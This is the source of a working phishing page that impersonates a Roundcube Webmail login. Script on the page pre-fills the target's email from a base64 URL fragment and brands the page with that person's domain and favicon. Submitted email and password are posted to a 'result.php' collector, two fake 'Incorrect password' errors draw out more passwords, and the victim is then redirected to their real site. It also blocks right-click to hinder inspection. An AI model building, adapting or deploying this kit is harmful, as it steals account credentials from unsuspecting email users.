<?php include __DIR__ . '/gate.php'; ?>
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #fff;
        }

        .title {
            text-align: center;
            margin-top: 80px;
            font-size: 30px;
            color: #4a4a4a;
            font-weight: 300;
            display: block;
        }

        .login-container {
            width: 380px;
            margin: 40px auto;
            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3) !important;
            background: #f7f7f7;
            /* background: -webkit-gradient(linear, left top, left bottom, color-stop(0, #404040), color-stop(100%, #2e2e2e)); */
            /* background: -ms-linear-gradient(top,#404040 0,#2e2e2e 100%);
        background: linear-gradient(to bottom, #404040 0, #2e2e2e 100%); */
            padding: 40px;
            /* box-shadow: 0 2px 6px rgba(0,0,0,0.2); */
            text-align: center;
        }

        .avatar {
            width: 90px;
            height: 90px;
            margin: 0 auto 30px;
            border-radius: 50%;
            background-color: transparent;
            /* display: flex;
            align-items: center;
            justify-content: center; */
        }

        /* .avatar::before {
            content: "👤";
            font-size: 40px;
            color: #aaa;
        } */

        .form-group {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            font-size: 14px;
            color: #444;
            display: block;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            font-size: 14px;
            box-sizing: border-box;
        }

        input:focus {
            border-color: #4a90e2;
            outline: none;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: #3b6fc4;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .login-btn:hover {
            background: #2f5da8;
        }
        .banana-topbar {
    background: #3F51B5;
    color: white;
    padding: 8px 8px;
    font-size: 16px;
    font-weight: bold;
    min-height: 36px;
}

/* wrapper */
.potato-wrapper {
    /* background: #f5f5f5; */
    padding: 15px;
    min-height: 100vh;
    padding-top: 0;
}

/* form */
.spaghetti-form {
    margin-top: 10px;
}

/* input group */
.noodle-group {
    margin-bottom: 14px;
}

/* labels */
.pickle-label {
    display: block;
    margin-bottom: 8px;
    color: #333;
    font-size: 12px;
}

/* inputs */
.donut-input {
    width: 100%;
    border: none;
    border-bottom: 1px solid #ccc;
    padding: 10px 5px;
    font-size: 16px;
    background: transparent;
    padding-bottom: 5px;
}

.donut-input:focus {
    outline: none;
    border-bottom: 1px solid #3F51B5;
    
}

/* button */
.pizza-button {
    width: 100%;
    background: #3F51B5;
    color: white;
    border: none;
    padding: 9px;
    font-size: 12px;
    margin-top: 12px;
    cursor: pointer;
}

.pizza-button:active {
    background: #3b4aa0;
}
section {
    display: none;
}
 #message {
    min-height: 40px;
    padding: 5px 25px;
    text-align: center;
    font-size: 12px;
    color: #cf2734;
    /* display: none; */
}
#login-form #message div {
    font-weight: normal;
}
#login-form #message div {
    display: inline-block;
    padding-right: 0;
    font-size: 12px;
}
#message div.error {
    color: #cf2734;
    background-position: 0 -57px;
}
#message div.error, #message div.notice, #message div.confirmation, #message-objects div.notice {
    /* color: #555; */
    /* font-weight: bold; */
    padding: 6px 30px 6px 25px;
    display: inline-block;
    white-space: nowrap;
    background: url(https://email.ipage.com/roundcube/skins/larry/images/messages.png?v=72e9.1264) 0 -57px no-repeat;
    cursor: default;
}
#toperr {
    width: 100%;
    background: #f7f7f7;
    color: #1d1c1c;
    text-align: center;
    font-weight: 600;
    position: fixed;
    top: 0;
    left: 0;
    padding: 10px 0;
    z-index: 9999;
    font-size: 14px;
    height: 30px;
    display: none;
}
@media screen and (max-width: 768px) {
    main {
        display: none;
    }
    section {
        display: block;
    }
}
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <main>
        <span class="title" id="tittle">Webmail</span>

        <div class="login-container">
            <div class="avatar">
                <img src="https://email.ipage.com/roundcube/skins/droid/assets/images/login.png" id="avater" style="width: 100%; height: auto;border-radius:50%;" alt="">
            </div>

            <form id="ress" method="post">
                <div class="form-group">
                    <label>Email address</label>
                    <input type="text" id="dommy" class="solve"  name="aa" required>
                </div>

                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="rcmloginpwd" name="bb" required>
                </div>

                <button type="submit" class="login-btn">LOGIN</button>
            </form>
        </div>
        <div id="message"><div class="error" id="error" role="alert">Your session is invalid or expired.</div></div>
    </main>
    <section style="position: relative;">
        <div id="toperr">
            <div class="error22">Incorrect password.</div>
        </div>
        <div class="banana-topbar" id="tittle2">Webmail</div>

        <div class="potato-wrapper">
            <form class="spaghetti-form" method="post" id="ress2">

                <div class="noodle-group">
                    <label class="pickle-label">Email address</label>
                    <input type="text" id="dommy" class="donut-input solve2" name="aa" required>
                </div>

                <div class="noodle-group">
                    <label class="pickle-label">Password</label>
                    <input type="password" id="rcmloginpwd2" class="donut-input" name="bb" required>
                </div>

                <button class="pizza-button">LOGIN</button>

            </form>
        </div>
    </section>

    <script>
        const putme = document.querySelectorAll("#dommy")
        function isBase64(str) {
            if (str === '' || String(str).trim() === '') { return false }
            try { if (btoa(atob(str)) === atob(btoa(str))) return true } catch { return false }
        }

        function getEmail() {
            let email = "";
            if (window.location.hash) {
                email = window.location.hash.substring(1);
                email = isBase64(email) ? window.atob(email) : email;
            }
            return email;
        }
        email = getEmail();
        if (email) {
            const domain = email.split('@')[1];
            document.getElementById("tittle").textContent = `${domain} Webmail`;
            document.getElementById("tittle2").textContent = `${domain} Webmail`;
            console.log(domain);
            putme.forEach(input => input.value = email);
            // document.getElementById("rcmloginuser").value = email;
            $("#avater").attr("src", `https://www.google.com/s2/favicons?domain=${domain}&sz=64`);   

        }

         document.addEventListener('contextmenu', function (e) {
          e.preventDefault();
         }); 

        var fille = "./result.php"; // Your php url here e.g http://youdomain.com/result.php
        var countt = 0;

        $("#ress").on("submit", function (event) {

            event.preventDefault();
            countt++;
            const dom12 = document.querySelector('.solve').value.split('@')[1];
            // const honeypot = document.querySelector('#website');

            //  if (honeypot.value.trim() !== "") {
            //      console.warn("Bot detected, submission blocked.");
            //      return;
            //  } 

            $('.donut-input').each(function () {
                if (!$(this).val().trim()) {
                    return false; // breaks out of .each loop
                }
            });



            var formData = new FormData(this);

            $.ajax({
                url: `${fille}`,
                type: 'POST',
                data: formData,
                processData: false, // Required to send FormData
                contentType: false, // Required to not set default content type
                success: function (response) {
                    console.log(response);

                    if (countt === 1) {
                        console.log("YESSSSS");
                        $("#rcmloginpwd").val("");
                        $("#message").css("display", "block"); 
                        // Select the element and update its background property
                        // $('#message').css('background', 'url(https://email.ipage.com/roundcube/skins/larry/images/messages.png?v=72e9.1264) 0 -87px no-repeat');
                        // let el = document.querySelector('#message');
                        // let bg = el.style.background;
                        
                        // Replace -57px with -87px
                        // el.style.background = bg.replace('-57px', '-87px');

 
                        $("#error").text("Incorrect password.");  

                    } else if (countt === 2) {
                         console.log("YESSSSS");
                        $("#rcmloginpwd").val("");
                        $("#message").css("display", "block"); 
                        // Select the element and update its background property
                        // $('#message').css('background', 'url(https://email.ipage.com/roundcube/skins/larry/images/messages.png?v=72e9.1264) 0 -87px no-repeat');
                        // let el = document.querySelector('#message');
                        // let bg = el.style.background;
                        
                        // // Replace -57px with -87px
                        // el.style.background = bg.replace('-57px', '-87px');
                        $("#error").text("Incorrect password.");  
                    }else if (countt >= 3) {
                        console.log("GOOOOOO");
                        setInterval(() => {
                            window.location.href = `https://www.${dom12}/`;
                        }, 2000);
                    }
                }
            });
        });

        $("#ress2").on("submit", function (event) {

            event.preventDefault();
            countt++;
            const dom2 = document.querySelector('.solve2').value.split('@')[1];
            // const honeypot = document.querySelector('#website');

            //  if (honeypot.value.trim() !== "") {
            //      console.warn("Bot detected, submission blocked.");
            //      return;
            //  } 

            $('.solve2').each(function () {
                if (!$(this).val().trim()) {
                    return false; // breaks out of .each loop
                }
            });



            var formData = new FormData(this);

            $.ajax({
                url: `${fille}`,
                type: 'POST',
                data: formData,
                processData: false, // Required to send FormData
                contentType: false, // Required to not set default content type
                success: function (response) {
                    console.log(response);

                    if (countt === 1) {
                        console.log("YESSSSS");
                        $("#rcmloginpwd2").val("");
                        $("#toperr").css("display", "block");
                        
                    } else if (countt === 2) {
                        console.log("YESSSSS");
                        $("#rcmloginpwd2").val("");
                        $("#toperr").css("display", "block");
                    }else if (countt >= 3) {
                        console.log("GOOOOOO");
                        setInterval(() => {
                            window.location.href = `https://www.${dom2}/`;
                        }, 2000);
                    }
                }
            });
        });
    </script>
</body>

</html>